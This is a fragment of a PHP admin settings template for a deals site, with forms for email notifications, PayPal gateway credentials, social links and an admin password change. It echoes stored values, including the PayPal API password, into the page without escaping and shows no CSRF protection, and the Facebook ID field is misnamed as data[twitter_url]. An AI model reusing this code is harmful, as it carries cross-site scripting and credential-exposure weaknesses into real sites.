		</div>


		<div id="notifications" class="tab_content">
		<form action="#notifications" method="post">
		<?php if (isset($_GET['msg']) && $_GET['msg'] == "updated" && $_GET['tab'] == "notifications") { ?>
			<div class="success_box">Settings have been successfully saved!</div>
		<?php } ?>
		<table width="100%" cellpadding="2" cellspacing="5" border="0">
          <tr>
            <td width="5" valign="middle" align="left" class="tb1">&nbsp;</td>
            <td valign="top"><input type="hidden" name="data[email_new_order]" value="0" /><input type="checkbox" name="data[email_new_order]" value="1" size="40" class="checkboxx" <?php echo ($settings['email_new_order'] == 1) ? "checked" : "" ?>/>&nbsp; new order notification</td>
          </tr>
          <tr>
            <td valign="middle" align="left" class="tb1">&nbsp;</td>
            <td valign="top"><input type="hidden" name="data[email_new_ticket]" value="0" /><input type="checkbox" name="data[email_new_ticket]" value="1" size="40" class="checkboxx" <?php echo ($settings['email_new_ticket'] == 1) ? "checked" : "" ?>/>&nbsp; new support tiket notification</td>
          </tr>
          <tr>
            <td valign="middle" align="left" class="tb1">&nbsp;</td>
            <td valign="top"><input type="hidden" name="data[email_deal_expired]" value="0" /><input type="checkbox" name="data[email_deal_expired]" value="1" size="40" class="checkboxx" <?php echo ($settings['email_deal_expired'] == 1) ? "checked" : "" ?> />&nbsp; deal ended notification</td>
          </tr>
          <tr>
            <td valign="middle" align="left" class="tb1">&nbsp;</td>
            <td valign="top"><input type="hidden" name="data[email_sold_out]" value="0" /><input type="checkbox" name="data[email_sold_out]" value="1" size="40" class="checkboxx" <?php echo ($settings['email_sold_out'] == 1) ? "checked" : "" ?>/>&nbsp; deal sold out notification</td>
          </tr>
          <tr>
            <td valign="middle" align="left" class="tb1">&nbsp;</td>
            <td valign="top"><input type="hidden" name="data[email_new_comment]" value="0" /><input type="checkbox" name="data[email_new_comment]" value="1" size="40" class="checkboxx" <?php echo ($settings['email_new_comment'] == 1) ? "checked" : "" ?>/>&nbsp; new comment notification</td>
          </tr>
          <tr>
            <td valign="middle" align="left" class="tb1">&nbsp;</td>
            <td valign="top"><input type="hidden" name="data[email_new_testimonial]" value="0" /><input type="checkbox" name="data[email_new_testimonial]" value="1" size="40" class="checkboxx" <?php echo ($settings['email_new_testimonial'] == 1) ? "checked" : "" ?>/>&nbsp; new testimonial notification</td>
          </tr>
          <tr>
            <td valign="middle" align="left" class="tb1">&nbsp;</td>
            <td valign="top"><input type="hidden" name="data[email_new_deal]" value="0" /><input type="checkbox" name="data[email_new_deal]" value="1" size="40" class="checkboxx" <?php echo ($settings['email_new_deal'] == 1) ? "checked" : "" ?>/>&nbsp; new submitted deal notification</td>
          </tr>
          <tr>
			<td>&nbsp;</td>
			<td align="left" valign="middle">
				<input type="hidden" name="tabid" id="tabid" value="notifications" />
				<input type="hidden" name="action" id="action" value="savesettings" />
				<input type="submit" name="save" id="save" class="submit" value="Save Settings" />
			</td>
          </tr>
		  </table>
		  </form>
		</div>


		<div id="gateways" class="tab_content">
		<form action="#gateways" method="post">
		<?php if (isset($_GET['msg']) && $_GET['msg'] == "updated" && $_GET['tab'] == "gateways") { ?>
			<div class="success_box">Settings have been successfully saved!</div>
		<?php } ?>
        <table width="100%" cellpadding="2" cellspacing="5" border="0">
          <tr>
            <td valign="middle" align="left" class="tb1">Default Gateway:</td>
            <td valign="middle">
				<select name="data[cc_gateway]">
					<option value="paypal" <?php if ($settings['cc_gateway'] == "paypal") echo "selected"; ?>>Paypal</option>
					<option value="authorizenet" <?php if ($settings['cc_gateway'] == "authorizenet") echo "selected"; ?>>Authorize.Net</option>
					<option value="other" <?php if ($settings['cc_gateway'] == "other") echo "selected"; ?>>Other</option>
				</select>
				<span class="note">credit cards payment gateway</span>
			</td>
          </tr>
          <tr>
            <td valign="middle" align="left" class="tb1">Paypal IPN:</td>
            <td valign="middle">
				<select name="data[paypal_ipn]">
					<option value="1" <?php if ($settings['paypal_ipn'] == "1") echo "selected"; ?>>on</option>
					<option value="0" <?php if ($settings['paypal_ipn'] == "0") echo "selected"; ?>>off</option>
				</select>
			</td>
          </tr>
          <tr>
            <td width="100" valign="middle" align="left" class="tb1">PayPal Account:</td>
            <td valign="middle">
				<input type="text" name="data[paypal_account]" value="<?php echo $settings['paypal_account']; ?>" size="40" class="textbox" />&nbsp; <img src="images/icons/paypal.png" align="absmiddle" />
			</td>
          </tr>
		  <tr>
            <td valign="middle" align="left" class="tb1">PayPal API Username:</td>
            <td valign="middle">
				<input type="text" name="data[paypal_api_username]" value="<?php echo $settings['paypal_api_username']; ?>" size="40" class="textbox" />
			</td>
          </tr>
          <tr>
            <td valign="middle" align="left" class="tb1">PayPal API Password:</td>
            <td valign="middle">
				<input type="password" name="data[paypal_api_password]" value="<?php echo $settings['paypal_api_password']; ?>" size="40" class="textbox" />
			</td>
          </tr>
          <tr>
            <td valign="middle" align="left" class="tb1">PayPal API Signature:</td>
            <td valign="middle">
				<input type="text" name="data[paypal_api_signature]" value="<?php echo $settings['paypal_api_signature']; ?>" size="40" class="textbox" />
			</td>
          </tr>
          <tr>
			<td>&nbsp;</td>
			<td align="left" valign="middle">
				<input type="hidden" name="tabid" id="tabid" value="gateways" />
				<input type="hidden" name="action" id="action" value="savesettings" />
				<input type="submit" name="save" id="save" class="submit" value="Save Settings" />
			</td>
          </tr>
        </table>
		</form>
		</div>
			

		<div id="other" class="tab_content">
		<form action="#other" method="post">
		<?php if (isset($_GET['msg']) && $_GET['msg'] == "updated" && $_GET['tab'] == "other") { ?>
			<div class="success_box">Settings have been successfully saved!</div>
		<?php } ?>
          <table width="100%" cellpadding="2" cellspacing="5" border="0">
		  <tr>
            <td width="100" valign="middle" align="left" class="tb1">Facebook Page:</td>
            <td valign="top"><input type="text" name="data[facebook_url]" value="<?php echo $settings['facebook_url']; ?>" size="40" class="textbox" /></td>
          </tr>
          <tr>
            <td valign="middle" align="left" class="tb1">Show Facebook Like Box:</td>
            <td valign="top">
				<select name="data[facebook_box]">
					<option value="1" <?php if ($settings['facebook_box'] == "1") echo "selected"; ?>>yes</option>
					<option value="0" <?php if ($settings['facebook_box'] == "0") echo "selected"; ?>>no</option>
				</select>			
			</td>
          </tr>
          <tr>
            <td valign="middle" align="left" class="tb1">Facebook ID:</td>
            <td valign="top"><input type="text" name="data[twitter_url]" value="<?php echo $settings['twitter_url']; ?>" size="18" class="textbox" /><span class="note"> e.g. 1234567890</span></td>
          </tr>
          <tr>
            <td valign="middle" align="left" class="tb1">Twitter Page:</td>
            <td valign="top"><input type="text" name="data[twitter_url]" value="<?php echo $settings['twitter_url']; ?>" size="40" class="textbox" /></td>
          </tr>
          <tr>
            <td valign="middle" align="left" class="tb1">Google Plus Page:</td>
            <td valign="top"><input type="text" name="data[gplus_url]" value="<?php echo $settings['gplus_url']; ?>" size="40" class="textbox" /></td>
          </tr>
          <tr>
            <td valign="middle" align="left" class="tb1">Pinterest Page:</td>
            <td valign="top"><input type="text" name="data[pinterest_url]" value="<?php echo $settings['pinterest_url']; ?>" size="40" class="textbox" /></td>
          </tr>
          <tr>
            <td valign="middle" align="left" class="tb1">Tumblr Page:</td>
            <td valign="top"><input type="text" name="data[tumblr_url]" value="<?php echo $settings['tumblr_url']; ?>" size="40" class="textbox" /></td>
          </tr>
          <tr>
            <td>&nbsp;</td>
			<td align="left" valign="middle">
				<input type="hidden" name="tabid" id="tabid" value="other" />
				<input type="hidden" name="action" id="action" value="savesettings" />
				<input type="submit" name="save" id="save" class="submit" value="Save Settings" />
			</td>
          </tr>
		  </table>
		  </form>
		</div>


		<div id="password" class="tab_content">
		<form action="#password" method="post">
		<?php if (isset($_GET['msg']) && $_GET['msg'] == "passupdated") { ?>
			<div class="success_box">Password has been changed successfully!</div>
		<?php } ?>
        <table width="100%" cellpadding="2" cellspacing="5" border="0">
		<?php if (isset($allerrors2) && $allerrors2 != "") { ?>
		 <tr>
            <td colspan="2"><div class="error_box"><?php echo $allerrors2; ?></div></td>
         </tr>
		<?php } ?>
          <tr>
            <td width="100" valign="middle" align="right" class="tb1">Current Password:</td>
            <td valign="top"><input type="password" name="cpassword" value="" size="30" class="textbox" /></td>
          </tr>
          <tr>
            <td valign="middle" align="right" class="tb1">New Admin Password:</td>
            <td valign="top"><input type="password" name="npassword" value="" size="30" class="textbox" /></td>
          </tr>
          <tr>
            <td valign="middle" align="right" class="tb1">Confirm New Password:</td>
            <td valign="top"><input type="password" name="npassword2" value="" size="30" class="textbox" /></td>
          </tr>
          <tr>
            <td>&nbsp;</td>
			<td align="left" valign="middle">
				<input type="hidden" name="tabid" id="tabid" value="password" />
				<input type="hidden" name="action" id="action" value="updatepassword" />
				<input type="submit" name="psave" id="psave" class="submit" value="Change Password" />
			</td>
          </tr>
        </table>
		</form>
		</div>

<?php require_once ("inc/footer.inc.php"); ?>